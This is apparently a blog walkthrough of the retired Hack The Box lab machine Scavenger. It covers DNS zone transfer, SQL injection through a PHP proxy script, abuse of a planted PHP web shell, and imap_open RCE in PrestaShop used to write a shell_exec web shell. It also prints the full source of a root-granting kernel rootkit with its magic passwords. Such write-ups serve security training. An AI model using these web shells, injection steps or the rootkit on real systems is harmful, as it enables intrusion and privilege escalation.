---
layout: post
title: "Scavenger: Hack The Box Walkthrough"
date: 2020-02-29 15:47:26 +0000
last_modified_at: 2020-02-29 15:47:26 +0000
category: Walkthrough
tags: ["Hack The Box", Scavenger, retired, Linux, Hard]
comments: true
image:
  feature: scavenger-htb-walkthrough.jpg
  credit: byrev / Pixabay
  creditlink: https://pixabay.com/photos/bucharest-dump-garbage-glina-iron-87227/
---

This post documents the complete walkthrough of Scavenger, a retired vulnerable [VM][1] created by [ompamo][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Scavenger is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535 10.10.10.155 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-08-20 06:53:31 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 53/tcp on 10.10.10.155                                    
Discovered open port 25/tcp on 10.10.10.155                                    
Discovered open port 80/tcp on 10.10.10.155                                    
Discovered open port 22/tcp on 10.10.10.155                                    
Discovered open port 43/tcp on 10.10.10.155                                    
Discovered open port 21/tcp on 10.10.10.155
```

Hmm, interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,22,43,53,80 -A --reason -oN nmap.txt 10.10.10.155
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey:
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
43/tcp open  whois?  syn-ack ttl 63
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Debian
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

Time to explore all these information like a scavenger would. :wink:

### Zone Transfer

From the `nmap` results, we see `supersechosting.htb` popping out. Maybe we can do a zone transfer on this guy?

```
# host -l supersechosting.htb 10.10.10.155
Using domain server:
Name: 10.10.10.155
Address: 10.10.10.155#53
Aliases:

supersechosting.htb name server ns1.supersechosting.htb.
supersechosting.htb has address 10.10.10.155
ftp.supersechosting.htb has address 10.10.10.155
mail1.supersechosting.htb has address 10.10.10.155
ns1.supersechosting.htb has address 10.10.10.155
whois.supersechosting.htb has address 10.10.10.155
www.supersechosting.htb has address 10.10.10.155
```

Sweet. So far so good. All the subdomains corroborates with the open ports. We'd better put them into `/etc/hosts`.

### WHOIS

Next up, we have WHOIS. Check out this little gem.

<a class="image-popup">
![06db5e00.png](/assets/images/posts/scavenger-htb-walkthrough/06db5e00.png)
</a>

Sure looks authentic. But, did you see the first line?

```
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
```

What is MariaDB doing there? If I had to guess, I would say that's an invitation to probe for SQL injection.

```
# echo "supersechosting.htb'" | nc 10.10.10.155 43
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''supersechosting.htb'') limit 1' at line 1
```

Oh yeah. Armed with this knowledge, I wrote a funnel of sorts in PHP and host it with Apache.

```php
<?php

        $sock = fsockopen("10.10.10.155", 43, $errno, $errstr, 30);
        if (!$sock) {
                echo "$errstr ($errno)\n";
        } else {
                $domain = $_GET['d'];
                $domain .= "\r\n";
                fwrite($sock, $domain);
                while (!feof($sock)) {
                        echo fgets($sock);
                }
                fclose($sock);
        }

?>
```

Long story short, using `sqlmap` against `http://localhost/index.php?d=supersechosting.htb` yields the following.

```
SELECT domain from customers; [4]:
[*] justanotherblog.htb
[*] pwnhats.htb
[*] rentahacker.htb
[*] supersechosting.htb
```

Let's do a zone transfer on all of them and add them to `/etc/hosts`.

### MantisBT Owned!

While I was exploring the `rentahacker.htb` domain, I chanced upon an interesting comment in the blog.

<a class="image-popup">
![47df2080.png](/assets/images/posts/scavenger-htb-walkthrough/47df2080.png)
</a>

Moving on to the bug tracker subdomain `sec03.rentahacker.htb`, I see this.

<a class="image-popup">
![47a09ce6.png](/assets/images/posts/scavenger-htb-walkthrough/47a09ce6.png)
</a>

That got me thinking, "maybe the hacker left a backdoor?".

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -t 20 --hc 404 http://sec03.rentahacker.htb/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://sec03.rentahacker.htb/FUZZ
Total requests: 81

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000043:  C=200      0 L        0 W            0 Ch        "shell.php"

Total time: 4.063213
Processed Requests: 81
Filtered Requests: 80
Requests/sec.: 19.93495
```

Indeed, but there's no output. Perhaps we need to brute force the parameter?

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 20 --hh 0 http://sec03.rentahacker.htb/shell.php?FUZZ=id
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://sec03.rentahacker.htb/shell.php?FUZZ=id
Total requests: 2588

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000197:  C=200      1 L        3 W           61 Ch        "hidden"

Total time: 30.90042
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 83.75290
```

Bam. There we go.

<a class="image-popup">
![36f4bf1d.png](/assets/images/posts/scavenger-htb-walkthrough/36f4bf1d.png)
</a>

I wrote a very simple bash script to display the output in terminal instead.

<div class="filename"><span>ib01c03.sh</span></div>

```bash
#!/bin/bash

HOST=sec03.rentahacker.htb
CMD=$(urlencode $@)

curl -s \
     "http://$HOST/shell.php?hidden=$CMD"
```

### Hack the World!

During enumeration of `ib01c03`'s account, I saw an email responding to `rentahacker.htb` email about their site being defaced.

<a class="image-popup">
![9d39fcbd.png](/assets/images/posts/scavenger-htb-walkthrough/9d39fcbd.png)
</a>

In the email, `supersechosting.htb` talked about working on another incident and guess what, FTP credentials to log into their FTP server.

Armed with this credential, I was able to retrieve important information about the incident happening over at pwnhats.htb (or `ib01c01`).

<a class="image-popup">
![620ede25.png](/assets/images/posts/scavenger-htb-walkthrough/620ede25.png)
</a>

Among the information gathered by `supersechosting.htb` was a network packet capture. And in it lies the credentials to access PrestaShop's back office secret URL.

<a class="image-popup">
![30939915.png](/assets/images/posts/scavenger-htb-walkthrough/30939915.png)
</a>

Here's the secret back office URL.

<a class="image-popup">
![0c53e264.png](/assets/images/posts/scavenger-htb-walkthrough/0c53e264.png)
</a>

While I was exploring the back office, I noticed something strange going on at the customer service options page, particularly with the IMAP settings. A little googling brought me to this blog [post](https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb). It was explaining how a vulnerability in `imap_open()` can be abused to gain remote code execution, and the real-life example given was PrestaShop 1.7.4.4!

<a class="image-popup">
![8bd84dee.png](/assets/images/posts/scavenger-htb-walkthrough/8bd84dee.png)
</a>

Long story short, the vulnerability arises because `rsh` is symbolic-linked to `ssh`. And the IMAP URL is passed to `ssh` in its entirety. That's why you see `-oProxyCommand` above.

Let's do something similar like what happened to `ib01c03`—we `echo` a `shell.php` to the base directory.

```
# echo 'echo "<?php echo shell_exec(\$_GET[0]); ?>" > ../shell.php' | base64 -w0 && echo
ZWNobyAiPD9waHAgZWNobyBzaGVsbF9leGVjKFwkX0dFVFswXSk7ID8+IiA+IC4uL3NoZWxsLnBocAo=
```

Simply replace the original `base64`-string with our own. Once that's done, we'll re-purpose the previous `bash` script for `ib01c01`.

<div class="filename"><span>ib01c01.sh</span></div>

```bash
#!/bin/bash

HOST=www.pwnhats.htb
CMD=$(urlencode $@)

curl -s \
     "http://$HOST/shell.php?0=$CMD"
```

The file `user.txt` is in `ib01c01`'s home directory.

<a class="image-popup">
![8016b522.png](/assets/images/posts/scavenger-htb-walkthrough/8016b522.png)
</a>

## Privilege Escalation

There was something else in the network packet capture that caught my attention.

<div class="filename"><span>root.c</span></div>

```c
#include <linux/init.h>   
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>    
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

#define  DEVICE_NAME "ttyR0"
#define  CLASS_NAME  "ttyR"

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

// Prototypes
static int     __init root_init(void);
static void    __exit root_exit(void);
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);

// Module info
MODULE_LICENSE("GPL");
MODULE_AUTHOR("pico");
MODULE_DESCRIPTION("Got r00t!.");
MODULE_VERSION("0.1");

static int            majorNumber;
static struct class*  rootcharClass  = NULL;
static struct device* rootcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int
root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t
root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{
  char   *data;
  char   magic[] = "g0tR0ot";

  struct cred *new_cred;

  data = (char *) kmalloc (len + 1, GFP_KERNEL);

  if (data)
    {
      copy_from_user (data, buf, len);
        if (memcmp(data, magic, 7) == 0)
   {
     if ((new_cred = prepare_creds ()) == NULL)
       {
  return 0;
       }
     V(new_cred->uid) = V(new_cred->gid) =  0;
     V(new_cred->euid) = V(new_cred->egid) = 0;
     V(new_cred->suid) = V(new_cred->sgid) = 0;
     V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
     commit_creds (new_cred);
   }
        kfree(data);
      }

    return len;
}


static int __init
root_init(void)
{
  // Create char device
  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
    {
      return majorNumber;
    }

   // Register the device class
   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(rootcharClass))
     {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       return PTR_ERR(rootcharClass);
   }

   // Register the device driver
   rootcharDevice = device_create(rootcharClass, NULL,
      MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(rootcharDevice))
     {
       class_destroy(rootcharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       return PTR_ERR(rootcharDevice);
     }

    return 0;    
}

static void __exit
root_exit(void)
{
  // Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);                     
  class_destroy(rootcharClass);                        
  unregister_chrdev(majorNumber, DEVICE_NAME);     
}


module_init(root_init);
module_exit(root_exit);
```

The rootkit code is taken from [here](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485).

We can see that the LKM is loaded.

<a class="image-popup">
![0334cf99.png](/assets/images/posts/scavenger-htb-walkthrough/0334cf99.png)
</a>

And the character device `/dev/ttyR0` has `666` permissions.

<a class="image-popup">
![4458061b.png](/assets/images/posts/scavenger-htb-walkthrough/4458061b.png)
</a>

The **magic** password `g0tR0ot` didn't work for me though.

<a class="image-popup">
![3810d064.png](/assets/images/posts/scavenger-htb-walkthrough/3810d064.png)
</a>

Maybe there's another **magic** password? I copied the loaded KVM to my machine and ran it through `r2`.

```
# ./ib01c01.sh "base64 ../.../root.ko" > root.ko.b64
```

<a class="image-popup">
![c3ced05c.png](/assets/images/posts/scavenger-htb-walkthrough/c3ced05c.png)
</a>

Looks like `g3tPr1v` could be the **magic** password. Let's give it a shot.

<a class="image-popup">
![d98b39e7.png](/assets/images/posts/scavenger-htb-walkthrough/d98b39e7.png)
</a>

With that, getting `root.txt` is a breeze.

<a class="image-popup">
![b8dcf476.png](/assets/images/posts/scavenger-htb-walkthrough/b8dcf476.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/202
[2]: https://www.hackthebox.eu/home/users/profile/9631
[3]: https://www.hackthebox.eu/
